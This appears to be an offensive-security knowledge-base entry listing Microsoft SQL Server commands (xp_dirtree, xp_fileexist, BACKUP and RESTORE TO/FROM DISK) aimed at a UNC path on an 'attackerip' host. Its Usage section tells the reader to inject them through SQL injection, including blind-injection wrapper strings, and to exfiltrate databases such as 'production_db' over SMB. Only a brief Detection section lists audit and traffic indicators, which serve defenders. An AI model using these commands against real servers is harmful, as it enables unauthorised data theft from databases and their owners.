---
id: 0eeddc00-ffbd-476c-89fa-797e79df9fb6
name: mssql-unc-path-exfiltration-commands
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:34.040390+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - SQL Server
tags:
  - mssql
  - unc-path
  - backup
  - exfiltration
validated: true
---

# mssql-unc-path-exfiltration-commands

## Code

```sql
xp_dirtree '\\attackerip\file'

This command returns a directory tree of a specified path from a remote server.

xp_fileexist '\\attackerip\file'

This command checks if the specified file exists on the remote server and returns a value of either 1 (if the file exists) or 0 (if the file does not exist).

BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'

This command creates a backup of the transaction log of the specified database and saves it to the specified file path on the remote server.

BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'

This command creates a backup of the specified database and saves it to the specified file path on the remote server.

RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'

This command restores a transaction log backup of the specified database from the specified file path on the remote server.

RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'

This command restores a database backup of the specified database from the specified file path on the remote server.

RESTORE HEADERONLY FROM DISK = '\\attackerip\file'

This command returns the header information of the backup file from the specified file path on the remote server.

RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'

This command returns a list of files included in the backup file from the specified file path on the remote server.

RESTORE LABELONLY FROM DISK = '\\attackerip\file'

This command returns the backup label information from the specified file path on the remote server.

RESTORE REWINDONLY FROM DISK = '\\attackerip\file'

This command rewinds the tape to the beginning of the backup file from the specified file path on the remote server.

RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'

This command verifies the backup file from the specified file path on the remote server.
```

## Description

This code block contains a series of MSSQL commands for interacting with UNC paths, including enumeration, existence checks, backups for exfiltration, and restore/verification operations. It supports out-of-band data retrieval by forcing the server to push files over SMB.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `attackerip` | Attacker's IP address for the UNC path | 192.168.1.100 |
| `file` | Target file or share name in UNC | public\exfil.bak |
| `TESTING` | Database name to backup/restore | production_db |
| `attackeri` | Typo in original for attacker IP; replace with correct IP | 192.168.1.100 |

## Usage

Inject these commands via SQL injection after gaining database access. Start with xp_dirtree and xp_fileexist for probing, then use BACKUP DATABASE/LOG for exfiltration. Wrap in injection strings like '1'; [command]; -- for blind SQLi. Use RESTORE commands post-exfil to verify integrity if needed.

## Detection

- Audit logs for BACKUP/RESTORE with UNC paths or xp_dirtree/xp_fileexist executions.
- SMB traffic anomalies: Large file transfers from SQL servers to external IPs.
- Query patterns in SQL logs containing '\\' UNC syntax.

## Related

- [[procedures/MSSQL-UNC-Path-Out-of-Band-Data-Retrieval]]
- [[mssql-backup-database-to-unc-path]]
